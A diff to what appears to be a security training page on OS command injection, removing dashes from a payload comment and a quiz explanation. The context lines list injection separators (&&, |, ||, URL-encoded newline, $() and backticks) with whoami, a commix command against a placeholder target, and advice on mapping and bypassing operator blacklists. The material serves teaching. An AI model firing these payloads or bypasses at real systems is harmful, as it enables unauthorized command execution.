@@ -47,7 +47,7 @@ python3 commix.py -u http://<TARGET> --data "cmd=whoami"
 127.0.0.1 && whoami          # && runs second only if first succeeds
 127.0.0.1 | whoami           # | pipes; only second output shown
 || whoami                    # || runs second only if first FAILS (break the first cmd)
-127.0.0.1%0awhoami           # newline (URL-encoded) — survives many blacklists
+127.0.0.1%0awhoami           # newline (URL-encoded) survives many blacklists
 $(whoami)  `whoami`          # sub-shell, Linux only
 ```
 
@@ -424,7 +424,7 @@ $env:HOMEPATH[0]           # \
     "Switch to SQL injection operators"
   ]}
   answer={1}
-  explanation="A newline (%0a) passing while ;/&& are blocked means the operator blacklist has a gap and %0a is your working separator. The methodical move is to keep reducing one character at a time next confirm whether space and the command word are filtered — then layer the matching bypasses. Firing a massive obfuscated payload blindly ignores the field length limit and the specific filters you haven't mapped yet."
+  explanation="A newline (%0a) passing while ;/&& are blocked means the operator blacklist has a gap and %0a is your working separator. The methodical move is to keep reducing one character at a time next confirm whether space and the command word are filtered then layer the matching bypasses. Firing a massive obfuscated payload blindly ignores the field length limit and the specific filters you haven't mapped yet."
 />
 
 <Quiz
